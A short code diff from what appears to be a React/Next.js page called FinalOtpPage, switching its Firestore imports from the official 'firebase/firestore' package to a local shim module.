@@ -7,7 +7,7 @@ import { Alert, AlertDescription } from "@/components/ui/alert"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
 import { StepShell } from "@/components/step-shell"
 import { db } from "@/lib/firebase"
-import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
+import { doc, onSnapshot, setDoc, Firestore } from "@/lib/firestore-shim"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 
 export default function FinalOtpPage() {
